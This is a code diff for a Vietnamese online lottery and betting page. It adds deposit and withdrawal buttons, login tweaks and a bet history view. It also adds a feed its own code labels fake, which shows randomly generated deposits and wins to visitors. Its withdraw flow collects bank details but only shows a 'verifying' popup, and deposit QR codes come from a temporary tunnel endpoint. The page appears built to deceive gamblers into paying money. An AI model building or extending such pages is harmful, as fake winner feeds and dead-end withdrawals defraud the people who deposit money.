@@ -477,6 +477,36 @@ iframe:hover{
   border-color:#22c55e;
   color:#22c55e;
 }
+/* đây là phần hoạt động chạy */
+.feed-item{
+  background: rgba(255,255,255,0.08); /* trắng trong */
+  backdrop-filter: blur(12px);
+
+  border:1px solid rgba(255,255,255,0.25);
+
+  padding:10px 14px;
+  border-radius:12px;
+
+  font-size:13px;
+  color:#fff;
+
+  box-shadow:
+    0 5px 20px rgba(0,0,0,.6),
+    0 0 15px rgba(255,255,255,0.15);
+
+  animation:slideUp .5s ease;
+  max-width:260px;
+
+  /* glow nhẹ */
+  transition:.3s;
+}
+
+.feed-item:hover{
+  transform:translateY(-2px);
+  box-shadow:
+    0 10px 25px rgba(0,0,0,.8),
+    0 0 25px rgba(255,255,255,0.25);
+}
 </style>
 </head>
 
@@ -496,6 +526,7 @@ iframe:hover{
     </div>
 
     <button class="btn" onclick="openPromo()">Nạp</button>
+    <button class="btn" style="background:#22c55e" onclick="withdraw()">Rút</button>
     <div class="gift-icon"
   onclick="event.stopPropagation(); openGiftPopup();"
   style="position:relative;cursor:pointer">
@@ -532,12 +563,16 @@ iframe:hover{
   <div class="card">
     <h3>🎯 Đặt vé</h3>
     <button class="btn" onclick="openBet()">+ Thêm vé</button>
-    <div id="list"></div>
   </div>
 
   <div class="card">
     <h3>📜 Lịch sử đặt cược</h3>
+    
     <div id="history" class="history"></div>
+        <div id="list"></div>
+    <button class="btn" style="margin-top:10px;width:100%" onclick="goAccount('history')">
+      Xem thêm
+    </button>
   </div>
 
   <!-- AI -->
@@ -570,7 +605,11 @@ iframe:hover{
 
 <!-- MODAL BET -->
 <div class="modal" id="betModal">
-<div class="modal-box">
+<div class="modal-box" style="position:relative">
+  <button onclick="closeModal('betModal')" style="
+    position:absolute; top:10px; right:12px;
+    background:none; border:none; color:#fff; font-size:18px; cursor:pointer;
+  ">✖</button>
 <h3>Đặt vé</h3>
 <input id="so" placeholder="Số">
 <select id="loai">
@@ -586,18 +625,33 @@ iframe:hover{
 
 <!-- LOGIN -->
 <div class="modal" id="loginModal">
-  <div class="modal-box">
+  <div class="modal-box" style="position:relative">
+  <button onclick="closeModal('loginModal')" style="
+    position:absolute; top:10px; right:12px;
+    background:none; border:none; color:#fff; font-size:18px; cursor:pointer;
+  ">✖</button>
     <h3>Đăng nhập</h3>
     <input id="loginUser" placeholder="Tài khoản">
     <input id="loginPass" type="password" placeholder="Mật khẩu">
     <button class="btn" onclick="login()">Đăng nhập</button>
+    <p style="margin-top:10px; font-size:13px; text-align:center;">
+      Chưa có tài khoản?
+      <span style="color:#38bdf8; cursor:pointer;"
+        onclick="openRegister(); closeModal('loginModal')">
+        Đăng ký
+      </span>
+    </p>
   </div>
 </div>
 
 <!-- REGISTER -->
 <!-- REGISTER FULL -->
 <div class="modal" id="registerModal">
-  <div class="modal-box" style="max-width:500px">
+  <div class="modal-box" style="max-width:500px; position:relative">
+  <button onclick="closeModal('registerModal')" style="
+    position:absolute; top:10px; right:12px;
+    background:none; border:none; color:#fff; font-size:18px; cursor:pointer;
+  ">✖</button>
 
     <h3>Đăng ký tài khoản</h3>
 
@@ -609,12 +663,6 @@ iframe:hover{
           Phải có ≥6 ký tự (chữ + số), không ký tự đặc biệt
         </div>
       </div>
-
-      <input id="regEmail" placeholder="Email">
-
-      <input id="regFirstName" placeholder="Tên*" required>
-
-      <input id="regLastName" placeholder="Họ*" required>
 
       <div class="input-wrap">
         <input id="regPass" type="password" placeholder="Mật khẩu*" required>
@@ -669,14 +717,6 @@ iframe:hover{
     <p>Áp dụng cho các thẻ nạp từ 1 triệu trở lên</p>
 
     <form id="promo-form" class="promo-form">
-      <label>Họ tên
-        <input type="text" id="promo-name" required>
-      </label>
-
-      <label>SĐT
-        <input type="tel" id="promo-phone" required>
-      </label>
-
       <label>Số tiền
         <input type="number" id="promo-amount" min="1000000" required>
       </label>
@@ -724,6 +764,7 @@ function init(){
   }
 
   updateUI();
+  renderBets(); // 👈 thêm dòng này
 }
 
 
@@ -731,7 +772,6 @@ function init(){
 function updateBalance(){
   document.getElementById("balance").innerText = balance.toLocaleString();
 }
-function openNap(){napModal.style.display="flex";}
 function nap(){
   let t = Number(napTien.value||0);
   if(!t) return alert("Nhập số tiền");
@@ -791,18 +831,34 @@ function settleAllLose(){
 }
 
 function renderBets(){
-  list.innerHTML=""; history.innerHTML="";
-  bets.slice(0,50).forEach(b=>{
-    let el=document.createElement("div");
-    el.className="bet-item";
-    el.innerHTML=`<span>${b.so} (${b.loai})</span><b>${b.tien.toLocaleString()}đ</b>`;
-    list.appendChild(el);
-
-    let h=document.createElement("div");
-    h.textContent = "✔ " + b.so + " - " + b.tien.toLocaleString()+"đ";
-    history.appendChild(h);
-  });
-}
+    let list = document.getElementById("list");
+    history.innerHTML="";
+  
+    // ===== PHẦN ĐẶT VÉ (HIỆN FULL hoặc 3 tùy bạn)
+    bets.slice(0,3).forEach(b=>{
+      let el=document.createElement("div");
+      el.className="bet-item";
+      el.innerHTML=`<span>${b.so} (${b.loai})</span><b>${b.tien.toLocaleString()}đ</b>`;
+      list.appendChild(el);
+    });
+  
+    // ===== LỊCH SỬ (CHỈ 3 CÁI)
+    bets.slice(0,3).forEach(b=>{
+      let h=document.createElement("div");
+      h.className="bet-item";
+  
+      let statusText = b.status === "pending" ? "⏳"
+                      : b.status === "lose" ? "❌"
+                      : "🏆";
+  
+      h.innerHTML = `
+        <span>${statusText} ${b.so}</span>
+        <b>${b.tien.toLocaleString()}đ</b>
+      `;
+  
+      history.appendChild(h);
+    });
+  }
 
 // ===== AI (heuristic) =====
 function sendAI(){
@@ -872,7 +928,9 @@ function checkKetQua(){
 }
 
 // ===== START =====
-init();
+window.addEventListener("DOMContentLoaded", () => {
+  init();
+});
 setInterval(()=>{
   if(isAfter1835()){
     settleAllLose();
@@ -966,13 +1024,24 @@ let rawData = `
 79 1.11% 9
 80 1.11% 9
 81 0.86% 7
-82 1.11% (9 lượt)
-83 0.62% (5 lượt)
-84 0.62% (5 lượt)
-85 0.62% (5 lượt)
-86 0.62% (5 lượt)
-87 1.23% (10 lượt) 88 0.99% (8 lượt) 89 0.99% (8 lượt) 90 0.86% (7 lượt) 91 1.98% (16 lượt) 92 1.36% (11 lượt) 93 0.86% (7 lượt) 94 1.36% (11 lượt) 95 1.48% (12 lượt) 96 0.37% (3 lượt) 97 0.99% (8 lượt) 98 0.62% (5 lượt)
-99 0.86% (7 lượt)
+82 1.11% 9
+83 0.62% 5
+84 0.62% 5
+85 0.62% 5
+86 0.62% 5
+87 1.23% 10 
+88 0.99% 8
+89 0.99% 8 
+90 0.86% 7
+91 1.98% 16
+92 1.36% 11 
+93 0.86% 7 
+94 1.36% 11 
+95 1.48% 12 
+96 0.37% 3 
+97 0.99% 8 
+98 0.62% 5
+99 0.86% 
 `;
 
 // ===== PARSE =====
@@ -1194,6 +1263,33 @@ document.getElementById("promo-close").onclick = ()=>{
   resetPopup();
 };
 
+// js đoạn rút tiền
+function withdraw(){
+  let u = getCurrentUser();
+  if(!u){
+    alert("Bạn cần đăng nhập");
+    openLogin();
+    return;
+  }
+
+  let data = JSON.parse(localStorage.getItem("data_"+u) || "{}");
+
+  let profile = data.profile || {};
+
+  // kiểm tra đủ info
+  if(
+    !profile.fullname ||
+    !profile.bank ||
+    !profile.bankName
+  ){
+    alert("⚠️ Bạn cần cập nhật hồ sơ trước khi rút tiền!");
+    window.location.href = "account.html?tab=profile";
+    return;
+  }
+
+  // nếu đủ thì hiện popup
+  showWithdrawPopup();
+}  
 // ===== ELEMENT =====
 const form = document.getElementById("promo-form");
 const amountEl = document.getElementById("promo-amount");
@@ -1313,15 +1409,39 @@ function startCountdown(sec){
 }
 
 // ===== FETCH QR (GIỐNG TRANG TRÊN) =====
-async function fetchQR(price){
-  let res = await fetch("https://nature-superior-bass-franklin.trycloudflare.com/run-bot",{
-    method:"POST",
-    headers:{"Content-Type":"application/x-www-form-urlencoded"},
-    body:"price="+price
-  });
+let isLoadingQR = false;
 
-  let blob = await res.blob();
-  return URL.createObjectURL(blob);
+async function fetchQR(price){
+  if(isLoadingQR){
+    return;
+  }
+
+  isLoadingQR = true;
+
+  let btn = document.querySelector(".promo-btn");
+  btn.disabled = true;
+  btn.innerText = "Đang tạo QR...";
+  btn.style.opacity = 0.6;
+
+  try{
+    let res = await fetch("https://surfing-harry-assumed-reviewed.trycloudflare.com/run-bot",{
+      method:"POST",
+      headers:{"Content-Type":"application/x-www-form-urlencoded"},
+      body:"price="+price
+    });
+
+    let blob = await res.blob();
+    return URL.createObjectURL(blob);
+
+  }catch(e){
+    alert("Lỗi tạo QR");
+  }finally{
+    isLoadingQR = false;
+
+    btn.disabled = false;
+    btn.innerText = "Đăng ký & lấy QR";
+    btn.style.opacity = 1;
+  }
 }
 
 // ===== RESET =====
@@ -1378,18 +1498,32 @@ overlay.addEventListener("click", function(e){
 
 // mở modal
 function openLogin(){
+  registerModal.style.display = "none"; // 👈 thêm
   loginModal.style.display = "flex";
 }
+
 function openRegister(){
+  loginModal.style.display = "none"; // 👈 thêm
   registerModal.style.display = "flex";
 }
 
 // đăng ký
 function register(){
-  let u = document.getElementById("regUser").value.trim(); // dùng email làm user
-  let p = document.getElementById("regPass").value.trim();
+  let u = regUser.value.trim();
+  let p = regPass.value.trim();
+  let p2 = regPass2.value.trim();
 
-  if(!u || !p) return alert("Nhập đủ thông tin");
+  if(!u || !p || !p2){
+    return alert("Nhập đủ thông tin");
+  }
+
+  if(p !== p2){
+    return alert("Mật khẩu nhập lại không khớp");
+  }
+
+  if(p.length < 6){
+    return alert("Mật khẩu ≥ 6 ký tự");
+  }
 
   let users = JSON.parse(localStorage.getItem("users") || "{}");
 
@@ -1403,6 +1537,7 @@ function register(){
   localStorage.setItem("currentUser", u);
 
   alert("Đăng ký thành công!");
+
   registerModal.style.display = "none";
 
   loadUserData();
@@ -1467,12 +1602,14 @@ function updateUI(){
   let authButtons = document.getElementById("authButtons");
 
   if(u){
+    userBox.style.display = "block"; 
     userBox.innerHTML = `
       👤 ${u}
       <div class="user-dropdown">
         <div onclick="goAccount('profile')">Hồ sơ</div>
-        <div onclick="goAccount('history')">Lịch sử nạp</div>
+        <div onclick="goAccount('history')">Lịch sử đặt cược</div>
         <div onclick="goAccount('settings')">Cài đặt</div>
+        <div onclick="complaint()">Khiếu nại</div>
         <div onclick="logout()" style="color:red">Đăng xuất</div>
       </div>
     `;
@@ -1507,6 +1644,7 @@ dropdown.onmouseleave = ()=>{
 };
 
   }else{
+    userBox.style.display = "none";
     userBox.innerHTML = "";
     authButtons.style.display = "flex";
   }
@@ -1525,6 +1663,26 @@ function goAccount(tab){
   }
 
   window.location.href = "account.html?tab=" + tab;
+}
+
+// js gọi ip khiếu nại 
+  function complaint(){
+  fetch("https://your-domain.com/complaint-image", {
+    method: "POST"
+  })
+  .then(res => res.blob())
+  .then(blob => {
+    let url = URL.createObjectURL(blob);
+
+    // mở ảnh
+    let img = document.createElement("img");
+    img.src = url;
+    img.style.width = "100%";
+
+    let w = window.open("");
+    w.document.write(img.outerHTML);
+  })
+  .catch(()=> alert("Lỗi khiếu nại"));
 }
 
 // ===== USERNAME TOOLTIP =====
@@ -1600,6 +1758,123 @@ regPassInput.addEventListener("input", ()=>{
     passHint.innerText = "✅ Mật khẩu mạnh";
   }
 });
+
+// đây là phần cho hoạt động js 
+  // ===== FAKE LIVE FEED =====
+
+// random tên
+function randomName(){
+  let chars = "abcdefghijklmnopqrstuvwxyz";
+  let name = chars[Math.floor(Math.random()*chars.length)].toUpperCase();
+  name += "***";
+  return name;
+}
+
+// random tiền
+function randomMoney(){
+  let arr = [
+    100000,200000,300000,500000,
+    1000000,2000000,3000000,5000000,
+    10000000
+  ];
+
+  let v = arr[Math.floor(Math.random()*arr.length)];
+  return v.toLocaleString();
+}
+
+// random giờ hôm qua
+function getYesterdayDate(){
+  let d = new Date();
+  d.setDate(d.getDate() - 1);
+
+  let day = String(d.getDate()).padStart(2,'0');
+  let month = String(d.getMonth()+1).padStart(2,'0');
+  let year = d.getFullYear();
+
+  return `${day}/${month}/${year}`;
+}
+
+// tạo 300 data
+let feedData = [];
+
+function generateFeedData(){
+  let actions = [
+    () => `💰 ${randomName()} đã nạp ${randomMoney(100000,5000000)}đ`,
+    () => `🎯 ${randomName()} vừa đặt cược`,
+    () => `💸 ${randomName()} đã nạp thêm ${randomMoney(200000,3000000)}đ`,
+    () => `🏆 ${randomName()} đã trúng ${randomMoney(500000,10000000)}đ (hôm qua ${getYesterdayDate()})`
+  ];
+
+  for(let i=0;i<300;i++){
+    let action = actions[Math.floor(Math.random()*actions.length)];
+    feedData.push(action());
+  }
+}
+
+generateFeedData();
+
+// hiển thị
+function showFeed(){
+  let box = document.getElementById("liveFeed");
+  if(!box) return;
+
+  let item = document.createElement("div");
+  item.className = "feed-item";
+
+  let text = feedData[Math.floor(Math.random()*feedData.length)];
+  item.innerText = text;
+
+  box.prepend(item);
+
+  // giữ tối đa 4 cái
+  if(box.children.length > 4){
+    box.removeChild(box.lastChild);
+  }
+
+  // tự mất sau 6s
+  setTimeout(()=>{
+    item.style.opacity = "0";
+    item.style.transform = "translateY(10px)";
+    setTimeout(()=> item.remove(), 400);
+  },6000);
+}
+  // rút tiền
+function showWithdrawPopup(){
+  document.getElementById("withdrawModal").style.display = "flex";
+}
+// function đóng chung hết các pop up 
+  function closeModal(id){
+  document.getElementById(id).style.display = "none";
+}
+document.querySelectorAll(".modal").forEach(modal=>{
+  modal.addEventListener("click", function(e){
+    if(e.target === modal){
+      modal.style.display = "none";
+    }
+  });
+});
+// chạy loop
+setInterval(showFeed, 3000);
 </script>
+<div id="liveFeed" style="
+  position:fixed;
+  bottom:20px;
+  left:20px;
+  z-index:9999;
+  display:flex;
+  flex-direction:column;
+  gap:8px;
+"></div>
+
+  <div class="modal" id="withdrawModal">
+  <div class="modal-box">
+    <h3>💸 Yêu cầu rút tiền</h3>
+
+    <p>⏳ Hệ thống đang xác minh thông tin của bạn.</p>
+    <p>Vui lòng chờ xử lý (1-5 phút)</p>
+
+    <button class="btn" onclick="closeModal('withdrawModal')">Đóng</button>
+  </div>
+</div>
 </body>
 </html>
